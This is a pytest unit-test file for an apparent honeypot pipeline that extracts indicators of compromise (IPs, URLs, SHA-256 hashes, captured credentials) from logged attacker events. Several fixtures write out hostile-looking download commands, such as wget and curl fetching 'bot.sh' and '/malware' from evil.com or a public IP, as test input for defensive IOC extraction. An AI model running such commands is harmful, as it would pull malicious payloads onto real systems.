"""tests/test_extract_iocs.py — Unit tests for pipeline.extract_iocs."""
from __future__ import annotations

import pytest

from pipeline.extract_iocs import extract_from_event, _is_private_ip


# ---------------------------------------------------------------------------
# Private IP helper
# ---------------------------------------------------------------------------

class TestIsPrivateIp:
    def test_rfc1918_10(self):
        assert _is_private_ip("10.0.0.1")

    def test_rfc1918_172(self):
        assert _is_private_ip("172.16.0.1")
        assert _is_private_ip("172.31.255.255")

    def test_rfc1918_192(self):
        assert _is_private_ip("192.168.1.1")

    def test_loopback(self):
        assert _is_private_ip("127.0.0.1")

    def test_public_not_private(self):
        assert not _is_private_ip("185.220.101.45")
        assert not _is_private_ip("8.8.8.8")


# ---------------------------------------------------------------------------
# Source IP IOC
# ---------------------------------------------------------------------------

class TestSourceIpIoc:
    def test_public_source_ip_becomes_ioc(self, make_test_event):
        ev = make_test_event(source_ip="185.220.101.45", event_type="login.failed")
        iocs, _ = extract_from_event(ev)
        ip_iocs = [i for i in iocs if i["ioc_type"] == "ip"]
        assert any(i["ioc_value"] == "185.220.101.45" for i in ip_iocs)

    def test_private_source_ip_not_ioc(self, make_test_event):
        ev = make_test_event(source_ip="192.168.1.5", event_type="login.failed")
        iocs, _ = extract_from_event(ev)
        assert not any(i["ioc_value"] == "192.168.1.5" for i in iocs)


# ---------------------------------------------------------------------------
# Credentials extraction
# ---------------------------------------------------------------------------

class TestCredentialExtraction:
    def test_login_failed_yields_cred(self, make_test_event):
        ev = make_test_event(
            event_type="login.failed",
            username="root",
            password="123456",
        )
        _, creds = extract_from_event(ev)
        assert len(creds) == 1
        assert creds[0]["username"] == "root"
        assert creds[0]["password"] == "123456"

    def test_login_success_yields_cred(self, make_test_event):
        ev = make_test_event(
            event_type="login.success",
            username="admin",
            password="admin",
        )
        _, creds = extract_from_event(ev)
        assert len(creds) == 1

    def test_non_login_event_no_cred(self, make_test_event):
        ev = make_test_event(event_type="command.input", command_str="ls")
        _, creds = extract_from_event(ev)
        assert creds == []

    def test_empty_username_password_no_cred(self, make_test_event):
        ev = make_test_event(event_type="login.failed", username=None, password=None)
        _, creds = extract_from_event(ev)
        assert creds == []


# ---------------------------------------------------------------------------
# URL and hash extraction from commands
# ---------------------------------------------------------------------------

class TestCommandIocExtraction:
    def test_url_extracted_from_command(self, make_test_event):
        ev = make_test_event(
            event_type="command.input",
            command_str="wget http://evil.com/bot.sh -O /tmp/bot",
        )
        iocs, _ = extract_from_event(ev)
        url_iocs = [i for i in iocs if i["ioc_type"] == "url"]
        assert any("evil.com/bot.sh" in i["ioc_value"] for i in url_iocs)

    def test_sha256_extracted_from_command(self, make_test_event):
        sha = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        ev = make_test_event(
            event_type="command.input",
            command_str=f"echo {sha}  /tmp/bot",
        )
        iocs, _ = extract_from_event(ev)
        sha_iocs = [i for i in iocs if i["ioc_type"] == "sha256"]
        assert any(i["ioc_value"] == sha for i in sha_iocs)

    def test_public_ip_extracted_from_command(self, make_test_event):
        ev = make_test_event(
            event_type="command.input",
            command_str="curl http://185.220.101.1/malware",
        )
        iocs, _ = extract_from_event(ev)
        ip_iocs = [i for i in iocs if i["ioc_type"] == "ip"]
        assert any(i["ioc_value"] == "185.220.101.1" for i in ip_iocs)

    def test_private_ip_not_extracted_from_command(self, make_test_event):
        ev = make_test_event(
            event_type="command.input",
            command_str="ping 192.168.0.1",
        )
        iocs, _ = extract_from_event(ev)
        assert not any(i["ioc_value"] == "192.168.0.1" for i in iocs)


# ---------------------------------------------------------------------------
# File download IOC extraction
# ---------------------------------------------------------------------------

class TestFileDownloadIoc:
    def test_url_from_file_download(self, make_test_event):
        sha = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
        ev = make_test_event(
            event_type="session.file_download",
            raw_data={"url": "http://185.220.101.1/bot.sh", "shasum": sha},
        )
        iocs, _ = extract_from_event(ev)
        assert any(i["ioc_type"] == "url" and "bot.sh" in i["ioc_value"] for i in iocs)
        assert any(i["ioc_type"] == "sha256" and i["ioc_value"] == sha for i in iocs)


# ---------------------------------------------------------------------------
# Deduplication
# ---------------------------------------------------------------------------

class TestDeduplication:
    def test_duplicate_iocs_deduplicated(self, make_test_event):
        ev = make_test_event(
            source_ip="1.2.3.4",
            event_type="command.input",
            command_str="wget http://evil.com/a && wget http://evil.com/a",
        )
        iocs, _ = extract_from_event(ev)
        url_vals = [i["ioc_value"] for i in iocs if i["ioc_type"] == "url"]
        assert len(url_vals) == len(set(url_vals))
